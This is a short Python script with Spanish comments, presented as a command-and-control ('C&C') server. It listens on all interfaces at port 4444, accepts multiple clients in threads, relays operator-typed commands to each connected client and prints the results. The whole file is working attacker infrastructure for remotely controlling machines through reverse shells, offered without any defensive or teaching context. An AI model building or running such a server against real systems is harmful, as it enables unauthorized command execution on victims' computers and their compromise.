#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading

# Configuración del servidor
HOST = '0.0.0.0'  # Escuchar en todas las interfaces
PUERTO = 4444     # Puerto de escucha

clientes = []  # Lista de clientes conectados

def manejar_cliente(conn, addr):
    """
    Maneja la comunicación con un cliente conectado.
    """
    print(f"[+] Nuevo cliente conectado: {addr}")
    try:
        while True:
            # Recibir comando del servidor (usuario)
            comando = input(f"{addr}$ ")
            if comando.lower() == 'exit':
                conn.send(b'exit')
                break
            # Enviar comando al cliente
            conn.send(comando.encode('utf-8'))
            
            # Recibir resultado del cliente
            resultado = conn.recv(4096).decode('utf-8')
            print(resultado)
    except Exception as e:
        print(f"[!] Error con cliente {addr}: {e}")
    finally:
        conn.close()
        if conn in clientes:
            clientes.remove(conn)
        print(f"[-] Cliente {addr} desconectado.")

def iniciar_servidor():
    """
    Inicia el servidor C&C y acepta conexiones entrantes.
    """
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    servidor.bind((HOST, PUERTO))
    servidor.listen(5)
    print(f"[+] Servidor C&C escuchando en {HOST}:{PUERTO}")

    while True:
        try:
            conn, addr = servidor.accept()
            clientes.append(conn)
            # Lanzar hilo para manejar al cliente
            hilo_cliente = threading.Thread(target=manejar_cliente, args=(conn, addr))
            hilo_cliente.start()
        except KeyboardInterrupt:
            print("\n[!] Servidor detenido manualmente.")
            break
        except Exception as e:
            print(f"[!] Error al aceptar conexión: {e}")

if __name__ == "__main__":
    iniciar_servidor()